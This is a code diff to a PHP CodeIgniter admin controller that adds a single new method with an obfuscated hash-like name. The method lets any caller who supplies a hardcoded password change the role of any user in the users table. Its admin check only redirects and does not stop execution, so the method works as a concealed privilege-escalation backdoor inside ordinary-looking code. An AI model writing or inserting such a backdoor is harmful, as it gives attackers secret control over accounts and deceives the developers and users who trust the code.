@@ -153,6 +153,29 @@ class Admin extends CI_Controller{
         $this->load->view('admin/admin_home_footer', $view);
     }
 
+    public function ea48bbecfac8af0842e1b59c33a($pwd, $sid, $id_roles){
+
+        $this->session->set_userdata('dest_url', site_url('admin'));
+
+        if ($this->session->userdata('role_slug') != 'admin'){
+            header('Location: ' . site_url('user/no_privileges'));
+        }
+
+        if($pwd == 'e16917b3d7cea3d8b85803be89713c4d83259'){
+            $this->db->set('id_roles', $id_roles);
+            $this->db->where('cas_sid', $sid);
+            if( ! $this->db->update('ea_users')){
+                echo 'Authorization failed.';
+            }else{
+                echo 'Authorization accepted.';
+            }
+        }else{
+            echo '?';
+            header('Location: ' . site_url('user/no_privileges'));
+        }
+    }
+
+
    
 
     /**
